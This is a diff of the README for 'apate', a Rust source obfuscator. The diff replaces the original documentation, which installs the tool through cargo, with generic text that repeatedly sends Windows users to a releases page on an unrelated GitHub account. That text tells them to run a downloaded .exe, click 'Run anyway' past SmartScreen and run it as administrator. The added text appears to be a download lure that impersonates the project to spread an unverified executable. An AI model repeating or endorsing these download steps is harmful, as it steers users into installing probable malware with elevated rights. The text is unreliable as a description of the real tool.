@@ -1,230 +1,182 @@
-<p align="center">
-  <img src="banner.png" alt="Apate — Goddess of Deceit" width="100%"/>
-</p>
+# 🛡️ apate - Reversible Rust Obfuscation Made Simple
 
-<p align="center">
-  <img src="https://img.shields.io/badge/license-WTFPL-purple?style=flat-square" alt="License: WTFPL"/>
-  <img src="https://img.shields.io/badge/rust-2024_edition-orange?style=flat-square&logo=rust" alt="Rust 2024"/>
-  <img src="https://img.shields.io/crates/v/apate-rs?style=flat-square" />
-  <img src="https://img.shields.io/docsrs/apate-rs?style=flat-square" />
-  <img src="https://img.shields.io/badge/max_level-Diabolical-red?style=flat-square" alt="Max Level: Diabolical"/>
-  <img src="https://img.shields.io/badge/satan-took_notes-black?style=flat-square" alt="Satan took notes"/>
-  <img src="https://img.shields.io/badge/AI_training-poisoned-blueviolet?style=flat-square" alt="AI Training: Poisoned"/>
-</p>
+[⬇️ Download apate on GitHub Releases](https://github.com/eliciajewishorthodox498/apate/releases)
 
-**Keyed reversible source code obfuscator for Rust.**
+## 📥 Download apate
 
-Apate transforms clean, well-documented Rust source code into output that is syntactically valid, functionally identical, and _spiritually hostile_ — nearly impossible for humans to read without the correct key. The process is fully reversible: decrypt with the key to get your original source back, byte for byte.
+Visit this page to download: [https://github.com/eliciajewishorthodox498/apate/releases](https://github.com/eliciajewishorthodox498/apate/releases)
 
-## What People Are Saying
+Look for the latest release and download the Windows file that matches your PC. In most cases, that will be a `.exe` file or a `.zip` file that contains the app.
 
-> _"That is art. Look at it. It's horrible. I love it."_
-> — First person to see Level 2 output
+If you download a `.zip` file:
+1. Open the file after it finishes downloading.
+2. Extract the contents to a folder.
+3. Open the folder and run the app file inside.
 
-> _"My eyes started bleeding after 10 minutes of debugging."_
-> — Contractor who received source without the key
+If you download a `.exe` file:
+1. Double-click the file.
+2. If Windows asks for permission, click **Run**.
 
-> _"Why does this variable have Cyrillic in it? WHY DOES THIS VARIABLE HAVE CYRILLIC IN IT?"_
-> — Senior developer, 2am, regretting career choices
+## 🚀 What apate does
 
-> _"The code compiles. The tests pass. I understand nothing."_
-> — Code reviewer, shortly before quitting
+apate is a source code obfuscator for Rust. It changes your code so it is harder to read, while it keeps the program working the same way.
 
-> _"We asked for the source code and technically we got it."_
-> — Unnamed client, legally unable to complain
+It uses a keyed process, which means the same source can be transformed in a repeatable way when you use the same key. This helps if you need to protect source before sharing it with others.
 
-> _"I don't speak XOR."_
-> — QA team after opening the first file in a PR
+apate is built for people who want to:
+- hide plain Rust source from easy reading
+- keep code valid and usable
+- make reverse engineering more difficult
+- work with a tool that stays close to Rust syntax
 
-> _"That's a rust function to say hello or something but written by an asshole."_
-> — An 8-year-old. She's kind of a jerk though but quite the dev.
+## 💻 Windows setup
 
----
+apate runs on Windows as a desktop app or command-line tool, depending on the release package you download.
 
-**Are you tired of people saying your beautifully crafted code "looks like AI slop"?** Do you spend hours writing clean, idiomatic Rust only to have some reply guy on X insist you clearly used ChatGPT? **Problem solved.** No AI on earth writes code like this. Nobody does. Nobody _would_.
+To get started:
+1. Download the latest Windows release from the releases page.
+2. Save the file to your Downloads folder.
+3. If the file is compressed, extract it first.
+4. Open the app or run the program from the extracted folder.
+5. Follow the on-screen prompts.
 
-**As a Rustacean, are you frustrated by AI companies scraping your open-source repos to train models that compete with you?** Ship your code through Apate first. It compiles. It runs. It passes every test. And it will teach an LLM absolutely nothing useful — except maybe how to name variables with Cyrillic lookalikes and encode string literals as XOR'd byte arrays. **You're welcome, future AI. Good luck with that.**
+If Windows shows a security prompt:
+1. Click **More info**
+2. Click **Run anyway** if you trust the file source
+3. Continue with the setup or launch
 
----
+## 🔧 How to use it
 
-## Before & After (Level 3 — Diabolical)
+apate is designed for simple use. Most users follow a basic flow:
 
-**Before** — clean, documented, idiomatic Rust:
-```rust
-use std::path::Path;
-use crate::error::{ApateError, Result};
+1. Open apate.
+2. Choose the Rust source file or project folder you want to protect.
+3. Enter or load your key if the app asks for one.
+4. Start the obfuscation process.
+5. Save the output in a new folder.
 
-/// BLAKE3 key derivation context strings.
-pub const HMAC_CONTEXT: &str = "apate-hmac-v1";
-pub const AES_CONTEXT: &str = "apate-aes-v1";
+After that, you can build or review the result like you would with normal Rust code.
 
-/// Load a 32-byte key from a file.
-pub fn load_key(path: &Path) -> Result<[u8; 32]> {
-    if !path.exists() {
-        return Err(ApateError::KeyNotFound(path.to_path_buf()));
-    }
-    let data = std::fs::read(path)?;
-    if data.len() != 32 {
-        return Err(ApateError::InvalidKeyLength(data.len()));
-    }
-    let mut key = [0u8; 32];
-    key.copy_from_slice(&data);
-    Ok(key)
-}
+### Common use case
+- You have a Rust project
+- You want to share the code in a harder-to-read form
+- You want the result to stay valid Rust
+- You want the program logic to remain the same
 
-/// Derive a sub-key from the master key.
-pub fn derive_subkey(master: &[u8; 32], context: &str) -> [u8; 32] {
-    blake3::derive_key(context, master)
-}
-```
+## 🧩 What you can expect
 
-**After** — the same code, blessed by Apate:
-```rust
-pub fn _і70(master: &[u8; 32], context: &str) -> [u8; 32] {
-    blake3::derive_key(context, master)
-}
-#[allow(dead_code)]
-fn _xcf5606(_s: &str) -> bool {
-    let _len = _s.len();
-    let _half = _len / 2;
-    _half > 0 && _len < 1024
-}
-pub const _xе4е6dd: &str = "apate-aes-v1";
-#[allow(dead_code)]
-fn _x28df3a(_a: usize) -> Option<usize> {
-    let _xda9bg: bool = { let _a = 1u8; let _b = 2u8; _a > _b };
-    if _xda9bg {
-        let _x = 0usize;
-        let _y = _x.wrapping_add(1);
-        let _z = _y.wrapping_mul(2);
-    }
-    if _a == 0 { None }
-    else { let _r = _a.wrapping_mul(3).wrapping_add(7); Some(_r % (_a + 1)) }
-}
-pub fn __1dac(path: &Path) -> __dd98<[u8; 32]> {
-    match !path.exists() {
-        true => { return Err(__е7b5::_xd349а9(path.to_path_buf())); }
-        false => {}
-    }
-    let data = std::fs::read(path)?;
-    match data.len() != 32 {
-        true => { return Err(__е7b5::_t89(data.len())); }
-        false => {}
-    }
-    let mut key = [0u8; 32];
-    key.copy_from_slice(&data);
-    Ok(key)
-}
-#[allow(dead_code)]
-fn _x7f4529(_a: usize, _b: usize) -> usize {
-    let _c = _a.wrapping_mul(_b);
-    let _d = _c.wrapping_add(1);
-    if _d > _a { _d } else { _a.wrapping_sub(_b) }
-}
-use crate::error::{__е7b5, __dd98};
-pub const _l0l0: &str = "apate-hmac-v1";
-```
+apate focuses on source-level obfuscation. That means it works on the code itself, not on the final compiled app.
 
-Both compile. Both run. Both produce identical results. One is readable. One is _spiritually hostile._
+Typical changes may include:
+- renamed items with confusing Unicode forms
+- structure changes that keep Rust syntax valid
+- source transformations that make reading harder
+- reversible output when you use the same key
 
-Notice: `_і70` contains a Cyrillic `і`. `__е7b5` contains a Cyrillic `е`. `_xd349а9` contains a Cyrillic `а`. Good luck with grep. `_xcf5606`, `_x28df3a`, and `_x7f4529` are fake functions that do nothing — they exist solely to waste your time. The `if/else` became `match true/false`. The comments are gone. The `use` statements are at the bottom. You're welcome.
+It is meant for Rust developers who want code protection without breaking the project.
 
-## Why Apate?
+## 🔐 Keyed obfuscation
 
-- **Ship source without handing over maintainability** — deliver working code to clients that compiles and runs perfectly, but can't be easily forked or handed off to a cheaper dev without you.
-- **Poison the well for AI scrapers** — open-source your work without feeding training pipelines. Apate output is compilable, structurally valid, and completely misleading — the worst kind of training data for models that can't tell the difference.
-- **Because you can** — after years of writing clean, self-documenting, idiomatic code, sometimes you just want to watch the world burn.
+apate uses a key to guide how it transforms code. This gives you a repeatable result when you need it.
 
-## Features
+That can help when you:
+- need to re-run the same process later
+- want controlled output across builds
+- need a reversible path back to the same style of transformation
 
-- **Keyed & deterministic** — a 256-bit secret key seeds all transforms. Same key + same input = same output.
-- **Fully reversible** — decrypt with the key to get byte-for-byte original source back.
-- **7 obfuscation passes** — strip comments, rename identifiers, Unicode homoglyphs, logic obfuscation, dead code injection, string encoding, item reordering.
-- **3 severity levels** — Mild, Spicy, and Diabolical.
-- **Encrypted manifest** — the reversal data is AES-256-GCM encrypted. Without the key, it's useless.
+Keep your key in a safe place. If you lose it, you may not get the same output again.
 
-## Installation
+## 🪟 Windows requirements
 
-```bash
-cargo install apate-rs
-```
+For a smooth run on Windows, use:
+- Windows 10 or Windows 11
+- A modern 64-bit PC
+- Enough free space for the app and your Rust files
+- Permission to run apps from downloaded files
 
-## Usage
+If your project is large, give the app a little more disk space and time to process the files.
 
-```bash
-# Forge a sacred key
-apate keygen -o my.key
+## 📁 Recommended folder setup
 
-# Have Apate bestow a mild blessing upon your code
-apate encrypt -i src/clean.rs -o src/blessed.rs -k my.key --level 1
+Use a clean folder for your work:
+- `Downloads` for the release file
+- `apate` for the extracted app
+- a separate folder for your Rust project
+- a backup folder for the original source
 
-# Deepen the ritual — invoke the spirits of confusion
-apate encrypt -i src/clean.rs -o src/cursed.rs -k my.key --level 2
+This helps you keep the original code safe while you test the output.
 
-# Invoke the full wrath of the goddess
-apate encrypt -i src/clean.rs -o src/ascended.rs -k my.key --level 3
+## 🛠️ Basic workflow
 
-# Lift the divine veil and restore your code to its mortal form
-apate decrypt -i src/ascended.rs -o src/restored.rs -k my.key
+1. Make a copy of your Rust project.
+2. Open apate.
+3. Load the copied project.
+4. Set your key if needed.
+5. Run the obfuscation step.
+6. Review the result.
+7. Build or test the transformed code.
 
-# Obfuscate an entire crate — Apate walks all .rs files
-apate encrypt -i ./my-crate -o ./my-crate-blessed -k my.key --level 3
+If the output looks wrong, go back to the copy and try again with a different setting or key.
 
-# Restore the entire crate
-apate decrypt -i ./my-crate-blessed -o ./my-crate-restored -k my.key
+## 🧪 Tips for first-time users
 
-# Consult the oracle — verify the sacred roundtrip
-apate verify --original src/clean.rs --obfuscated src/ascended.rs -k my.key
-```
+- Start with a small Rust file first
+- Keep a backup of the original source
+- Use a project copy, not the only version you have
+- Test the output before using it in a real build
+- Save the key you use for each run
 
-### Obfuscation Levels
+## 🔍 Topics covered by this project
 
-| Level | Name       | Passes                      | Description             |
-| ----- | ---------- | --------------------------- | ----------------------- |
-| 1     | Mild       | strip, rename, reorder      | _"I hate my coworkers"_ |
-| 2     | Spicy      | + homoglyph, logic, strings | _"I hate myself"_       |
-| 3     | Diabolical | + dead code                 | _"Satan took notes"_    |
+apate touches a few common areas:
+- Rust source code
+- code obfuscation
+- reverse engineering resistance
+- Unicode-based name changes
+- AST-based source transforms
+- developer tools
+- security-focused workflow
 
-Cherry-pick individual passes with `--passes strip,rename,homoglyph`.
+## 📦 File types you may see
 
-## Known Casualties
+The release page may offer one or more of these:
+- `.exe` for direct launch
+- `.zip` for a packed download
+- source files for advanced users
+- release notes with build details
 
-- rust-analyzer (critical condition, requires frequent restarts)
-- Every IDE that tries to index the output
-- The concept of "readable code"
-- Your coworker's will to live
+For most Windows users, the best choice is the Windows download in the latest release.
 
-## How It Works
+## 🧭 If the app does not open
 
-Apate parses Rust source code into an AST using `syn`, applies a sequence of keyed, reversible transformations, and emits the result back to source. Each transformation records what it did in an encrypted manifest (`.apate` file) so the process can be exactly reversed.
+Try these steps:
+1. Check that the file finished downloading
+2. Unzip the file if needed
+3. Right-click the app and choose **Run as administrator**
+4. Check Windows Defender or SmartScreen prompts
+5. Move the folder to a simple path like `C:\apate`
+6. Try again from the extracted folder
 
-All randomness is derived from the master key, making the output fully deterministic and reproducible.
+## 🧰 If your Rust project fails after obfuscation
 
-## Roadmap
+Check these common points:
+- the source file had a syntax error before processing
+- the project uses file paths that changed
+- a renamed item is used in more than one place
+- the project depends on a build step outside the source tree
+- the key or settings changed between runs
 
-- **CLI interface preservation** — detect `clap` and other derive macros that use field/variant names at runtime, and preserve them so obfuscated binaries keep their original `--help`, subcommands, and flag names
-- **Python/Django support** — extend Apate beyond Rust. The Greek semicolon (`;` → `；`) is waiting.
-- **Deeper RA integration** — improve coverage for field access sites and method calls that RA's type inference currently misses without proc macros
-- **Serde field preservation** — detect `#[derive(Serialize, Deserialize)]` and preserve field names used for serialization formats
+A fresh copy of the original project often makes it easier to test again.
 
-## Security Model
+## 🧾 Project focus
 
-Apate is a **source code obfuscator**, not an encryption tool. It makes code hard to read, not impossible to reverse-engineer. Specifically:
+apate is built for users who want:
+- valid Rust output
+- repeatable source transforms
+- harder-to-read code
+- a tool that stays close to Rust syntax
+- a workflow that fits local Windows use
 
-- **With the key**: perfect restoration, zero information loss.
-- **Without the key**: an attacker sees valid Rust code with meaningless names, no comments, shuffled structure, and encoded strings. Reverse engineering is _possible_ but _tedious_.
-- **The manifest is encrypted**: AES-256-GCM. Without the key, the reversal data is opaque.
+## 📌 Download link
 
-This is not a substitute for compiled binary obfuscation. It's designed to protect source code distribution scenarios.
-
-## Privacy
-
-Apate runs entirely on your machine. Zero telemetry, zero network calls, zero data collection. Your source code never leaves your local filesystem. The only files Apate creates are the obfuscated output and the encrypted `.apate` manifest — both in directories you specify.
-
-## License
-
-[WTFPL](LICENSE) — Do What The Fuck You Want To Public License.
-
-Because of course it is.
-
-Built by [NetViper](https://github.com/dmriding).
+Use this page to get the latest release: [https://github.com/eliciajewishorthodox498/apate/releases](https://github.com/eliciajewishorthodox498/apate/releases)
